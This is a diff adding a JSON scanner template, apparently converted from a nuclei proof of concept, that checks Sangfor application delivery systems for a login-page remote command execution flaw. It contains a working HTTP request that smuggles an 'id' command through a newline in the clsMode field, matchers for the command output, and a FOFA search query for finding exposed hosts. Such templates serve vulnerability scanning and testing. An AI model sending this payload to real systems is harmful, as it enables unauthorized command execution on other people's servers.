@@ -1,0 +1,119 @@
+{
+  "id": "sangfor-login-rce",
+  "name": "Sangfor Application Login - Remote Command Execution",
+  "author": "SleepingBag945",
+  "severity": "CRITICAL",
+  "description": "Sangfor application delivery management system login has a remote command execution vulnerability, through which an attacker can obtain server privileges and execute arbitrary commands\n",
+  "references": [
+    "https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/sangfor-login-rce.yaml"
+  ],
+  "tags": [
+    "sangfor",
+    "rce"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "fid\u003d\"iaytNA57019/kADk8Nev7g\u003d\u003d\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /rep/login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nclsMode\u003dcls_mode_login%0Aid%0A\u0026index\u003dindex\u0026log_type\u003dreport\u0026loginType\u003daccount\u0026page\u003dlogin\u0026rnd\u003d0\u0026userID\u003dadmin\u0026userPsw\u003d123\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code \u003d\u003d 200",
+            "regex(\"uid\u003d([0-9(a-z)]+) gid\u003d([0-9(a-z)]+) groups\u003d([0-9(a-z)]+)\", body)",
+            "contains(body, \"cluster_mode_others\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "sangfor-login-rce",
+    "info": {
+      "name": "Sangfor Application Login - Remote Command Execution",
+      "author": "SleepingBag945",
+      "severity": "critical",
+      "description": "Sangfor application delivery management system login has a remote command execution vulnerability, through which an attacker can obtain server privileges and execute arbitrary commands\n",
+      "reference": [
+        "https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/sangfor-login-rce.yaml"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "fid\u003d\"iaytNA57019/kADk8Nev7g\u003d\u003d\""
+      },
+      "tags": "sangfor,rce"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /rep/login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nclsMode\u003dcls_mode_login%0Aid%0A\u0026index\u003dindex\u0026log_type\u003dreport\u0026loginType\u003daccount\u0026page\u003dlogin\u0026rnd\u003d0\u0026userID\u003dadmin\u0026userPsw\u003d123\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code \u003d\u003d 200",
+              "regex(\"uid\u003d([0-9(a-z)]+) gid\u003d([0-9(a-z)]+) groups\u003d([0-9(a-z)]+)\", body)",
+              "contains(body, \"cluster_mode_others\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
